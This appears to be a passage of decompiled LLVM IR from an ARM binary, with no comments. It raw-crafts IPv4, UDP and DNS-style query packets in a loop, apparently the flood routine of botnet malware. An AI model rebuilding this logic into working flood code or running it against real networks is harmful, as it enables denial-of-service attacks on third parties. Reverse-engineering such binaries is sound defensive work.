  %stack_var_-2172.0 = phi i32 [ %v1_da88, %dec_label_pc_da7c ], [ %v1_daa0, %dec_label_pc_da94 ], [ %v1_dab0, %dec_label_pc_daac ], [ %v1_dac8, %dec_label_pc_dabc ], [ %v1_d674, %dec_label_pc_d644 ]
  store i32 %v6_d54c, i32* %r2.global-to-local, align 4
  %v2_d680 = icmp eq i32 %v6_d54c, 0
  store i1 %v2_d680, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_d680, label %dec_label_pc_da6c, label %dec_label_pc_d688

dec_label_pc_d688:                                ; preds = %dec_label_pc_d67c
  store i32 %v6_d54c, i32* %r0.global-to-local, align 4
  %v1_d68c = inttoptr i32 %v6_d54c to i8*
  %v2_d68c = call i32 @function_12370(i8* %v1_d68c)
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 %v2_d68c, i32* @r6, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_d6a0 = call i32 @function_14ba0(i32 2, i32 3, i32 17)
  store i32 %v3_d6a0, i32* @r0, align 4
  %v7_d6a4 = icmp eq i32 %v3_d6a0, -1
  store i1 %v7_d6a4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_d6a4, label %dec_label_pc_da6c, label %dec_label_pc_d6b0

dec_label_pc_d6b0:                                ; preds = %dec_label_pc_d688
  store i32 1, i32* %stack_var_-44, align 4
  %v6_d6b8 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_d6b8, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 3, i32* @r2, align 4
  %v5_d6cc = call i32 @function_14b30(i32 %v3_d6a0, i32 0, i32 3, i32 %v6_d6b8, i32 4)
  store i32 %v5_d6cc, i32* %r0.global-to-local, align 4
  %v7_d6d0 = icmp eq i32 %v5_d6cc, -1
  store i1 %v7_d6d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_d6d0, label %dec_label_pc_da64, label %dec_label_pc_d6d8

dec_label_pc_d6d8:                                ; preds = %dec_label_pc_d6b0
  %v0_d6e4 = load i32, i32* @sb, align 4
  %v0_d6ec = load i32, i32* @fp, align 4
  store i32 0, i32* @ip, align 4
  %v3_d6f4 = urem i32 %v7_d48c, 65536
  store i32 %v3_d6f4, i32* %r3.global-to-local, align 4
  %v3_d6f8 = urem i32 %v6_d4e8, 65536
  store i32 %v3_d6f8, i32* %r2.global-to-local, align 4
  %v3_d6fc = urem i32 %v0_d6ec, 65536
  store i32 %v3_d6fc, i32* %r1.global-to-local, align 4
  %v3_d700 = urem i32 %v0_d6e4, 65536
  store i32 %v3_d700, i32* %r0.global-to-local, align 4
  %v0_d704 = load i32, i32* @r8, align 4
  %v2_d704 = icmp eq i32 %v0_d704, 0
  store i1 %v2_d704, i1* %cpsr_z.global-to-local, align 1
  %v0_d718 = load i32, i32* @sl, align 4
  %v1_d718 = urem i32 %v0_d718, 256
  store i32 %v1_d718, i32* @fp, align 4
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_d704, label %dec_label_pc_d8c8, label %dec_label_pc_d724

dec_label_pc_d724:                                ; preds = %dec_label_pc_d6d8
  %v0_d724 = load i32, i32* @r6, align 4
  %v2_d724 = add i32 %v0_d724, %v1_d718
  %v3_d728 = mul i32 %v2_d724, 65536
  %v1_d72c = add i32 %v3_d728, 1769472
  %v3_d730 = udiv i32 %v1_d72c, 65536
  store i32 %v3_d730, i32* @sl, align 4
  %v1_d734 = add i32 %v0_d724, 1
  store i32 %v1_d734, i32* %r2.global-to-local, align 4
  %v1_d738 = add i32 %v3_d728, 3080192
  store i32 %v1_d738, i32* %r3.global-to-local, align 4
  %v3_d740 = udiv i32 %v1_d738, 65536
  store i32 %v3_d740, i32* @sb, align 4
  store i32 0, i32* @r5, align 4
  %v4_d788 = sext i8 %v5_d488 to i32
  %v2_d7ac = icmp eq i32 %v1_d4d0, 0
  %sext = mul i32 %v6_d4a4, 16777216
  %v3_d7a8 = sdiv i32 %sext, 16777216
  br label %dec_label_pc_d748

dec_label_pc_d748:                                ; preds = %dec_label_pc_d890, %dec_label_pc_d724
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 600, i32* %r0.global-to-local, align 4
  %v2_d750 = call i32 @function_13258(i32 600, i32 1)
  store i32 %v2_d750, i32* %r0.global-to-local, align 4
  store i32 %v2_d450, i32* %r1.global-to-local, align 4
  %v2_d75c = load i32, i32* @r5, align 4
  %v5_d75c = mul i32 %v2_d75c, 4
  %v6_d75c = add i32 %v5_d75c, %v2_d450
  %v7_d75c = inttoptr i32 %v6_d75c to i32*
  store i32 %v2_d750, i32* %v7_d75c, align 4
  %v3_d760 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_d760, i32* %r3.global-to-local, align 4
  %v0_d764 = load i32, i32* %r1.global-to-local, align 4
  %v4_d764 = mul i32 %v3_d760, 4
  %v5_d764 = add i32 %v0_d764, %v4_d764
  %v6_d764 = inttoptr i32 %v5_d764 to i32*
  %v7_d764 = load i32, i32* %v6_d764, align 4
  store i32 %v7_d764, i32* %r5.global-to-local, align 4
  %v1_d768 = inttoptr i32 %v7_d764 to i8*
  %v2_d768 = load i8, i8* %v1_d768, align 1
  %tmp94 = urem i8 %v2_d768, 16
  %v1_d76c = zext i8 %tmp94 to i32
  %v1_d770 = or i32 %v1_d76c, 64
  store i32 %v1_d770, i32* %r2.global-to-local, align 4
  %v1_d774 = trunc i32 %v1_d770 to i8
  store i8 %v1_d774, i8* %v1_d768, align 1
  %v0_d778 = load i32, i32* %r5.global-to-local, align 4
  %v1_d778 = inttoptr i32 %v0_d778 to i8*
  %v2_d778 = load i8, i8* %v1_d778, align 1
  %v3_d778 = zext i8 %v2_d778 to i32
  %v1_d77c = and i32 %v3_d778, 240
  %v1_d780 = or i32 %v1_d77c, 5
  store i32 %v1_d780, i32* %r3.global-to-local, align 4
  %v1_d784 = trunc i32 %v1_d780 to i8
  store i8 %v1_d784, i8* %v1_d778, align 1
  store i32 %v4_d788, i32* %r2.global-to-local, align 4
  %v0_d78c = load i32, i32* @sb, align 4
  store i32 %v0_d78c, i32* %r0.global-to-local, align 4
  %v2_d790 = load i32, i32* %r5.global-to-local, align 4
  %v3_d790 = add i32 %v2_d790, 1
  %v4_d790 = inttoptr i32 %v3_d790 to i8*
  store i8 %v5_d488, i8* %v4_d790, align 1
  %v1_d794 = call i32 @function_14898(i32 %v0_d78c)
  %v2_d794 = trunc i32 %v1_d794 to i16
  %v3_d798 = load i32, i32* %r5.global-to-local, align 4
  %v4_d798 = add i32 %v3_d798, 2
  %v5_d798 = inttoptr i32 %v4_d798 to i16*
  store i16 %v2_d794, i16* %v5_d798, align 2
  store i32 %v3_d6f4, i32* %r0.global-to-local, align 4
  %v1_d7a0 = call i32 @function_14898(i32 %v3_d6f4)
  %v2_d7a0 = trunc i32 %v1_d7a0 to i16
  store i32 %v1_d7a0, i32* %r0.global-to-local, align 4
  store i32 %v3_d7a8, i32* %r1.global-to-local, align 4
  store i32 %v1_d4d0, i32* %r3.global-to-local, align 4
  store i1 %v2_d7ac, i1* %cpsr_z.global-to-local, align 1
  %v3_d7b0 = load i32, i32* %r5.global-to-local, align 4
  %v4_d7b0 = add i32 %v3_d7b0, 4
  %v5_d7b0 = inttoptr i32 %v4_d7b0 to i16*
  store i16 %v2_d7a0, i16* %v5_d7b0, align 2
  %v0_d7b4 = load i32, i32* %r1.global-to-local, align 4
  %v1_d7b4 = trunc i32 %v0_d7b4 to i8
  %v2_d7b4 = load i32, i32* %r5.global-to-local, align 4
  %v3_d7b4 = add i32 %v2_d7b4, 8
  %v4_d7b4 = inttoptr i32 %v3_d7b4 to i8*
  store i8 %v1_d7b4, i8* %v4_d7b4, align 1
  %v0_d7b8 = load i32, i32* %r5.global-to-local, align 4
  %v1_d7b8 = add i32 %v0_d7b8, 20
  store i32 %v1_d7b8, i32* %r4.global-to-local, align 4
  %v1_d7bc = add i32 %v0_d7b8, 28
  store i32 %v1_d7bc, i32* @r7, align 4
  %v0_d7c0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_d7c0, label %dec_label_pc_d7c4, label %dec_label_pc_da54

dec_label_pc_d7c4:                                ; preds = %dec_label_pc_d748, %dec_label_pc_da54
  %v2_d7c8 = phi i32 [ %v0_d7b8, %dec_label_pc_d748 ], [ %v2_d7c8.pre, %dec_label_pc_da54 ]
  %v3_d7c8 = add i32 %v2_d7c8, 9
  %v4_d7c8 = inttoptr i32 %v3_d7c8 to i8*
  store i8 17, i8* %v4_d7c8, align 1
  store i32 ptrtoint (i32* @global_var_2295c.90 to i32), i32* %r3.global-to-local, align 4
  store i32 %stack_var_-2172.0, i32* %r1.global-to-local, align 4
  %v2_d7d4 = load i32, i32* @global_var_2295c.90, align 4
  store i32 %v2_d7d4, i32* %r2.global-to-local, align 4
  store i32 %v3_d6f8, i32* %r0.global-to-local, align 4
  %v1_d7dc = load i32, i32* %r5.global-to-local, align 4
  %v2_d7dc = add i32 %v1_d7dc, 12
  %v3_d7dc = inttoptr i32 %v2_d7dc to i32*
  store i32 %v2_d7d4, i32* %v3_d7dc, align 4
  %v0_d7e0 = load i32, i32* %r1.global-to-local, align 4
  %v1_d7e0 = load i32, i32* %r5.global-to-local, align 4
  %v2_d7e0 = add i32 %v1_d7e0, 16
  %v3_d7e0 = inttoptr i32 %v2_d7e0 to i32*
  store i32 %v0_d7e0, i32* %v3_d7e0, align 4
  %v1_d7e4 = call i32 @function_14898(i32 %v3_d6f8)
  %v2_d7e4 = trunc i32 %v1_d7e4 to i16
  %v3_d7e8 = load i32, i32* %r5.global-to-local, align 4
  %v4_d7e8 = add i32 %v3_d7e8, 20
  %v5_d7e8 = inttoptr i32 %v4_d7e8 to i16*
  store i16 %v2_d7e4, i16* %v5_d7e8, align 2
  store i32 %v3_d6fc, i32* %r0.global-to-local, align 4
  %v1_d7f0 = call i32 @function_14898(i32 %v3_d6fc)
  %v2_d7f0 = trunc i32 %v1_d7f0 to i16
  %v3_d7f4 = load i32, i32* %r4.global-to-local, align 4
  %v4_d7f4 = add i32 %v3_d7f4, 2
  %v5_d7f4 = inttoptr i32 %v4_d7f4 to i16*
  store i16 %v2_d7f0, i16* %v5_d7f4, align 2
  %v0_d7f8 = load i32, i32* @sl, align 4
  store i32 %v0_d7f8, i32* %r0.global-to-local, align 4
  %v1_d7fc = call i32 @function_14898(i32 %v0_d7f8)
  %v2_d7fc = trunc i32 %v1_d7fc to i16
  %v3_d800 = load i32, i32* %r4.global-to-local, align 4
  %v4_d800 = add i32 %v3_d800, 4
  %v5_d800 = inttoptr i32 %v4_d800 to i16*
  store i16 %v2_d7fc, i16* %v5_d800, align 2
  store i32 %v3_d700, i32* %r0.global-to-local, align 4
  %v1_d808 = call i32 @function_14898(i32 %v3_d700)
  %v2_d808 = trunc i32 %v1_d808 to i16
  %v3_d80c = load i32, i32* %r5.global-to-local, align 4
  %v4_d80c = add i32 %v3_d80c, 28
  %v5_d80c = inttoptr i32 %v4_d80c to i16*
  store i16 %v2_d808, i16* %v5_d80c, align 2
  store i32 256, i32* %r0.global-to-local, align 4
  %v1_d814 = call i32 @function_14898(i32 256)
  %v2_d814 = trunc i32 %v1_d814 to i16
  %v3_d818 = load i32, i32* @r7, align 4
  %v4_d818 = add i32 %v3_d818, 2
  %v5_d818 = inttoptr i32 %v4_d818 to i16*
  store i16 %v2_d814, i16* %v5_d818, align 2
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_d820 = call i32 @function_14898(i32 1)
  %v2_d820 = trunc i32 %v1_d820 to i16
  %v0_d824 = load i32, i32* %r5.global-to-local, align 4
  %v1_d824 = add i32 %v0_d824, 41
  store i32 %v1_d824, i32* %r3.global-to-local, align 4
  %v1_d828 = load i32, i32* @fp, align 4
  %v2_d828 = add i32 %v1_d828, %v1_d824
  store i32 %v2_d828, i32* %r4.global-to-local, align 4
  %v3_d82c = load i32, i32* @r7, align 4
  %v4_d82c = add i32 %v3_d82c, 4
  %v5_d82c = inttoptr i32 %v4_d82c to i16*
  store i16 %v2_d820, i16* %v5_d82c, align 2
  %v0_d830 = load i32, i32* @fp, align 4
  %v1_d830 = trunc i32 %v0_d830 to i8
  %v2_d830 = load i32, i32* %r5.global-to-local, align 4
  %v3_d830 = add i32 %v2_d830, 40
  %v4_d830 = inttoptr i32 %v3_d830 to i8*
  store i8 %v1_d830, i8* %v4_d830, align 1
  %v0_d834 = load i32, i32* %r4.global-to-local, align 4
  %v1_d834 = add i32 %v0_d834, 1
  store i32 %v1_d834, i32* %r0.global-to-local, align 4
  store i32 %v6_d54c, i32* %r1.global-to-local, align 4
  store i32 %v1_d734, i32* %r2.global-to-local, align 4
  %v3_d840 = call i32 @function_123e0(i32 %v1_d834, i32 %v6_d54c, i32 %v1_d734)
  store i32 %v3_d840, i32* %r0.global-to-local, align 4
  %v0_d844 = load i32, i32* @r6, align 4
  %v2_d844 = icmp eq i32 %v0_d844, 0
  store i1 %v2_d844, i1* %cpsr_z.global-to-local, align 1
  %tmp80 = icmp slt i32 %v0_d844, 1
  br i1 %tmp80, label %bb81, label %dec_label_pc_d854

bb81:                                             ; preds = %dec_label_pc_d7c4
  %v5_d848 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_d848, i32* %r0.global-to-local, align 4
  store i32 0, i32* @ip, align 4
  br label %dec_label_pc_d890

dec_label_pc_d854:                                ; preds = %dec_label_pc_d7c4
  store i32 0, i32* %ip.global-to-local, align 4
  %v0_d858 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_d858, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_d860

dec_label_pc_d860:                                ; preds = %.thread10, %dec_label_pc_d854
  %v0_d870 = phi i32 [ %storemerge, %.thread10 ], [ 0, %dec_label_pc_d854 ]
  %v0_d874 = phi i32 [ %v0_d888, %.thread10 ], [ 0, %dec_label_pc_d854 ]
  store i32 %v6_d54c, i32* %r2.global-to-local, align 4
  %v2_d864 = add i32 %v0_d874, %v6_d54c
  %v3_d864 = inttoptr i32 %v2_d864 to i8*
  %v4_d864 = load i8, i8* %v3_d864, align 1
  %v6_d864 = zext i8 %v4_d864 to i32
  store i32 %v6_d864, i32* %r3.global-to-local, align 4
  %v7_d868 = icmp eq i8 %v4_d864, 46
  store i1 %v7_d868, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_d868, label %bb82, label %.thread45

.thread45:                                        ; preds = %dec_label_pc_d860
  %v1_d8706 = add nsw i32 %v0_d870, 1
  store i32 %v1_d8706, i32* %r2.global-to-local, align 4
  %v1_d8748 = add i32 %v0_d874, 1
  store i32 %v1_d8748, i32* %r1.global-to-local, align 4
  br label %bb83

bb82:                                             ; preds = %dec_label_pc_d860
  %v1_d86c = load i32, i32* %r4.global-to-local, align 4
  %v3_d86c = add i32 %v1_d86c, %v0_d874
  store i32 %v3_d86c, i32* %r3.global-to-local, align 4
  %v1_d870 = add nsw i32 %v0_d870, 1
  store i32 %v1_d870, i32* %r2.global-to-local, align 4
  %v1_d874 = add i32 %v0_d874, 1
  store i32 %v1_d874, i32* %r1.global-to-local, align 4
  %v2_d878 = trunc i32 %v0_d870 to i8
  %v3_d878 = load i32, i32* %r0.global-to-local, align 4
  %v4_d878 = inttoptr i32 %v3_d878 to i8*
  store i8 %v2_d878, i8* %v4_d878, align 1
  %v0_d87c.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_d87c.pre, label %bb84, label %bb82.bb83_crit_edge

bb82.bb83_crit_edge:                              ; preds = %bb82
  %v1_d87c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb83

bb83:                                             ; preds = %bb82.bb83_crit_edge, %.thread45
  %v1_d87c = phi i32 [ %v1_d87c.pre, %bb82.bb83_crit_edge ], [ %v1_d8706, %.thread45 ]
  %v2_d87c = urem i32 %v1_d87c, 256
  br label %.thread10

bb84:                                             ; preds = %bb82
  %v1_d880 = load i32, i32* %r3.global-to-local, align 4
  %v2_d880 = add i32 %v1_d880, 1
  store i32 %v2_d880, i32* %r0.global-to-local, align 4
  br label %.thread10

.thread10:                                        ; preds = %bb83, %bb84
  %storemerge = phi i32 [ %v2_d87c, %bb83 ], [ 0, %bb84 ]
  store i32 %storemerge, i32* @ip, align 4
  %v0_d888 = load i32, i32* %r1.global-to-local, align 4
  %v1_d888 = load i32, i32* @r6, align 4
  %v9_d888 = icmp eq i32 %v0_d888, %v1_d888
  store i1 %v9_d888, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_d888, label %dec_label_pc_d890.loopexit, label %dec_label_pc_d860

dec_label_pc_d890.loopexit:                       ; preds = %.thread10
  %v2_d890.pre = load i32, i32* %r0.global-to-local, align 4
  %extract.t = trunc i32 %storemerge to i8
  br label %dec_label_pc_d890

dec_label_pc_d890:                                ; preds = %bb81, %dec_label_pc_d890.loopexit
  %v0_d890.off0 = phi i8 [ %extract.t, %dec_label_pc_d890.loopexit ], [ 0, %bb81 ]
  %v2_d890 = phi i32 [ %v2_d890.pre, %dec_label_pc_d890.loopexit ], [ %v5_d848, %bb81 ]
  %v3_d890 = inttoptr i32 %v2_d890 to i8*
  store i8 %v0_d890.off0, i8* %v3_d890, align 1
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_d898 = call i32 @function_14898(i32 1)
  %v2_d898 = trunc i32 %v1_d898 to i16
  %v0_d89c = load i32, i32* %r4.global-to-local, align 4
  %v1_d89c = load i32, i32* @r6, align 4
  %v2_d89c = add i32 %v1_d89c, %v0_d89c
  store i32 %v2_d89c, i32* %r4.global-to-local, align 4
  %v4_d8a0 = add i32 %v2_d89c, 2
  %v5_d8a0 = inttoptr i32 %v4_d8a0 to i16*
  store i16 %v2_d898, i16* %v5_d8a0, align 2
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_d8a8 = call i32 @function_14898(i32 1)
  %v2_d8a8 = trunc i32 %v1_d8a8 to i16
  store i32 %v1_d8a8, i32* %r0.global-to-local, align 4
  %v3_d8ac = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_d8ac, i32* %r3.global-to-local, align 4
  %v1_d8b0 = add i32 %v3_d8ac, 1
  store i32 %v1_d8b0, i32* @r5, align 4
  %v0_d8b4 = load i32, i32* %r4.global-to-local, align 4
  %v1_d8b4 = add i32 %v0_d8b4, 2
  store i32 %v1_d8b4, i32* @r4, align 4
  %v1_d8b8 = load i32, i32* @r8, align 4
  %v9_d8b8 = icmp eq i32 %v1_d8b0, %v1_d8b8
  store i1 %v9_d8b8, i1* %cpsr_z.global-to-local, align 1
  %v4_d8bc = add i32 %v0_d8b4, 4
  %v5_d8bc = inttoptr i32 %v4_d8bc to i16*
  store i16 %v2_d8a8, i16* %v5_d8bc, align 2
  %v0_d8c0 = load i32, i32* @r5, align 4
  store i32 %v0_d8c0, i32* %stack_var_-44, align 4
  %v5_d8c4 = icmp slt i32 %v1_d8b0, %v1_d8b8
  br i1 %v5_d8c4, label %dec_label_pc_d748, label %dec_label_pc_d8c8.loopexit

dec_label_pc_d8c8.loopexit:                       ; preds = %dec_label_pc_d890
  %v1_d8c8.pre = load i32, i32* @fp, align 4
  %v0_d8d0.pre.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_d8c8

dec_label_pc_d8c8:                                ; preds = %dec_label_pc_d8c8.loopexit, %dec_label_pc_d6d8
  %v0_d8d0.pre = phi i32 [ %v0_d8d0.pre.pre, %dec_label_pc_d8c8.loopexit ], [ 0, %dec_label_pc_d6d8 ]
  %v1_d8c8 = phi i32 [ %v1_d8c8.pre, %dec_label_pc_d8c8.loopexit ], [ %v1_d718, %dec_label_pc_d6d8 ]
  %v0_d8c8 = load i32, i32* @r6, align 4
  %v2_d8c8 = add i32 %v0_d8c8, %v1_d8c8
  store i32 %v2_d8c8, i32* @r7, align 4
  %v6_d8ec = inttoptr i32 %v2_d450 to i32*
  %v3_d8f4 = icmp eq i32 %v3_d6f4, 65535
  %v3_d90c = icmp eq i32 %v3_d6f8, 65535
  br label %dec_label_pc_d8cc

dec_label_pc_d8cc:                                ; preds = %dec_label_pc_d92c, %dec_label_pc_d8cc, %dec_label_pc_d8c8
  %v0_d8d0 = phi i32 [ %v0_d8d0.pre, %dec_label_pc_d8c8 ], [ 0, %dec_label_pc_d8cc ], [ %v1_d9bc, %dec_label_pc_d92c ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_d8d0 = icmp eq i32 %v0_d8d0, 0
  store i1 %v2_d8d0, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_d8d0, label %dec_label_pc_d8cc, label %dec_label_pc_d8dc

dec_label_pc_d8dc:                                ; preds = %dec_label_pc_d8cc
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v2_d450, i32* %r3.global-to-local, align 4
  store i32 65536, i32* %r5.global-to-local, align 4
  store i32 %v3_d6f4, i32* %r1.global-to-local, align 4
  %v7_d8ec = load i32, i32* %v6_d8ec, align 4
  store i32 %v7_d8ec, i32* @r4, align 4
  store i32 65535, i32* @r5, align 4
  store i1 %v3_d8f4, i1* %cpsr_z.global-to-local, align 1
  %v0_d8f8 = load i32, i32* @r7, align 4
  %v1_d8f8 = add i32 %v0_d8f8, 27
  store i32 %v1_d8f8, i32* @sb, align 4
  %v1_d8fc = add i32 %v0_d8f8, 47
  store i32 %v1_d8fc, i32* @sl, align 4
  %v1_d900 = add i32 %v7_d8ec, 20
  store i32 %v1_d900, i32* @r6, align 4
  br i1 %v3_d8f4, label %dec_label_pc_d9e8, label %dec_label_pc_d908

dec_label_pc_d908:                                ; preds = %dec_label_pc_d9c8, %dec_label_pc_d8dc
  store i32 %v3_d6f8, i32* %r2.global-to-local, align 4
  store i1 %v3_d90c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_d90c, label %dec_label_pc_d9fc, label %dec_label_pc_d914

dec_label_pc_d914:                                ; preds = %dec_label_pc_d9e8.dec_label_pc_d914_crit_edge, %dec_label_pc_d908
  %v1_d918 = phi i32 [ %v1_d918.pre, %dec_label_pc_d9e8.dec_label_pc_d914_crit_edge ], [ 65535, %dec_label_pc_d908 ]
  store i32 %v3_d6fc, i32* @r3, align 4
  %v9_d918 = icmp eq i32 %v3_d6fc, %v1_d918
  store i1 %v9_d918, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_d918, label %dec_label_pc_da10, label %dec_label_pc_d920

dec_label_pc_d920:                                ; preds = %dec_label_pc_d9fc.dec_label_pc_d920_crit_edge, %dec_label_pc_d914
  %v1_d924 = phi i32 [ %v1_d924.pre, %dec_label_pc_d9fc.dec_label_pc_d920_crit_edge ], [ %v1_d918, %dec_label_pc_d914 ]
  store i32 %v3_d700, i32* %r1.global-to-local, align 4
  %v9_d924 = icmp eq i32 %v3_d700, %v1_d924
  store i1 %v9_d924, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_d924, label %dec_label_pc_da24, label %dec_label_pc_d92c

dec_label_pc_d92c:                                ; preds = %dec_label_pc_da10, %dec_label_pc_d920, %dec_label_pc_da24
  %v0_d92c = load i32, i32* @r4, align 4
  %v1_d92c = add i32 %v0_d92c, 41
  store i32 %v1_d92c, i32* %r0.global-to-local, align 4
  %v0_d930 = load i32, i32* @fp, align 4
  store i32 %v0_d930, i32* %r1.global-to-local, align 4
  %v2_d934 = inttoptr i32 %v1_d92c to i8*
  %v3_d934 = call i32 @function_f634(i8* %v2_d934, i32 %v0_d930)
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_d93c = load i32, i32* @r4, align 4
  %v3_d93c = add i32 %v2_d93c, 10
  %v4_d93c = inttoptr i32 %v3_d93c to i16*
  store i16 0, i16* %v4_d93c, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_d944 = load i32, i32* @r4, align 4
  store i32 %v0_d944, i32* @r0, align 4
  %v2_d948 = call i32 @function_dadc(i32 %v0_d944, i32 20)
  %v3_d948 = trunc i32 %v2_d948 to i16
  store i32 %v2_d948, i32* %r0.global-to-local, align 4
  %v3_d94c = load i32, i32* @r4, align 4
  %v4_d94c = add i32 %v3_d94c, 10
  %v5_d94c = inttoptr i32 %v4_d94c to i16*
  store i16 %v3_d948, i16* %v5_d94c, align 2
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_d954 = load i32, i32* @r6, align 4
  %v3_d954 = add i32 %v2_d954, 6
  %v4_d954 = inttoptr i32 %v3_d954 to i16*
  store i16 0, i16* %v4_d954, align 2
  %v0_d958 = load i32, i32* @r6, align 4
  store i32 %v0_d958, i32* @r1, align 4
  %v1_d95c = add i32 %v0_d958, 4
  %v2_d95c = inttoptr i32 %v1_d95c to i16*
  %v3_d95c = load i16, i16* %v2_d95c, align 2
  %v4_d95c = zext i16 %v3_d95c to i32
  store i32 %v4_d95c, i32* %r2.global-to-local, align 4
  %v0_d960 = load i32, i32* @sb, align 4
  store i32 %v0_d960, i32* %r3.global-to-local, align 4
  %v0_d964 = load i32, i32* @r4, align 4
  store i32 %v0_d964, i32* %r0.global-to-local, align 4
  %v4_d968 = call i32 @function_db2c(i32 %v0_d964, i32 %v0_d958, i32 %v4_d95c, i32 %v0_d960)
  %v5_d968 = trunc i32 %v4_d968 to i16
  store i32 %v4_d968, i32* %r0.global-to-local, align 4
  %v3_d96c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_d96c, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %v3_d974 = mul i32 %v3_d96c, 32
  store i32 %v3_d974, i32* %ip.global-to-local, align 4
  %v3_d978 = load i32, i32* @r6, align 4
  %v4_d978 = add i32 %v3_d978, 6
  %v5_d978 = inttoptr i32 %v4_d978 to i16*
  store i16 %v5_d968, i16* %v5_d978, align 2
  store i32 %stack_var_-2172.0, i32* %r2.global-to-local, align 4
  %v0_d980 = load i32, i32* @r6, align 4
  %v1_d980 = add i32 %v0_d980, 2
  %v2_d980 = inttoptr i32 %v1_d980 to i16*
  %v3_d980 = load i16, i16* %v2_d980, align 2
  %v4_d980 = zext i16 %v3_d980 to i32
  store i32 %v4_d980, i32* %r6.global-to-local, align 4
  %v0_d984 = load i32, i32* %ip.global-to-local, align 4
  %v1_d984 = load i32, i32* %r3.global-to-local, align 4
  %tmp95 = mul i32 %v1_d984, -8
  %v5_d984 = add i32 %v0_d984, %tmp95
  %v1_d988 = load i32, i32* %r1.global-to-local, align 4
  %v2_d988 = add i32 %v1_d988, %v5_d984
  store i32 %v2_d988, i32* %ip.global-to-local, align 4
  %v2_d98c = add i32 %v2_d988, 4
  %v3_d98c = inttoptr i32 %v2_d98c to i32*
  store i32 %stack_var_-2172.0, i32* %v3_d98c, align 4
  %v0_d990 = load i32, i32* %r6.global-to-local, align 4
  %v1_d990 = trunc i32 %v0_d990 to i16
  %v2_d990 = load i32, i32* %ip.global-to-local, align 4
  %v3_d990 = add i32 %v2_d990, 2
  %v4_d990 = inttoptr i32 %v3_d990 to i16*
  store i16 %v1_d990, i16* %v4_d990, align 2
  %v0_d994 = load i32, i32* @r4, align 4
  store i32 %v0_d994, i32* @r1, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 %v3_d6a0, i32* @r0, align 4
  %v0_d9a0 = load i32, i32* @sl, align 4
  store i32 %v0_d9a0, i32* @r2, align 4
  store i32 16, i32* @r4, align 4
  %v0_d9b0 = call i32 @function_14ae4()
  %v3_d9b4 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_d9b4, i32* %r3.global-to-local, align 4
  %v1_d9b8 = add i32 %v3_d9b4, 1
  store i32 %v1_d9b8, i32* %r0.global-to-local, align 4
  %v1_d9bc = load i32, i32* @r8, align 4
  %v9_d9bc = icmp eq i32 %v1_d9b8, %v1_d9bc
  store i1 %v9_d9bc, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_d9b8, i32* %stack_var_-44, align 4
  %v6_d9c4 = icmp slt i32 %v1_d9b8, %v1_d9bc
  br i1 %v6_d9c4, label %dec_label_pc_d9c8, label %dec_label_pc_d8cc

dec_label_pc_d9c8:                                ; preds = %dec_label_pc_d92c
  store i32 %v2_d450, i32* %r3.global-to-local, align 4
  store i32 65536, i32* %r5.global-to-local, align 4
  store i32 %v3_d6f4, i32* %r1.global-to-local, align 4
  %v4_d9d4 = mul i32 %v1_d9b8, 4
  %v5_d9d4 = add i32 %v4_d9d4, %v2_d450
  %v6_d9d4 = inttoptr i32 %v5_d9d4 to i32*
  %v7_d9d4 = load i32, i32* %v6_d9d4, align 4
  store i32 %v7_d9d4, i32* @r4, align 4
  store i32 65535, i32* @r5, align 4
  store i1 %v3_d8f4, i1* %cpsr_z.global-to-local, align 1
  %v1_d9e0 = add i32 %v7_d9d4, 20
  store i32 %v1_d9e0, i32* @r6, align 4
  br i1 %v3_d8f4, label %dec_label_pc_d9e8, label %dec_label_pc_d908

dec_label_pc_d9e8:                                ; preds = %dec_label_pc_d9c8, %dec_label_pc_d8dc
  %v0_d9e8 = call i32 @function_f570()
  %v1_d9e8 = trunc i32 %v0_d9e8 to i16
  store i32 %v0_d9e8, i32* %r0.global-to-local, align 4
  store i32 %v3_d6f8, i32* %r2.global-to-local, align 4
  %v1_d9f0 = load i32, i32* @r5, align 4
  %v9_d9f0 = icmp eq i32 %v3_d6f8, %v1_d9f0
  store i1 %v9_d9f0, i1* %cpsr_z.global-to-local, align 1
  %v3_d9f4 = load i32, i32* @r4, align 4
  %v4_d9f4 = add i32 %v3_d9f4, 4
  %v5_d9f4 = inttoptr i32 %v4_d9f4 to i16*
  store i16 %v1_d9e8, i16* %v5_d9f4, align 2
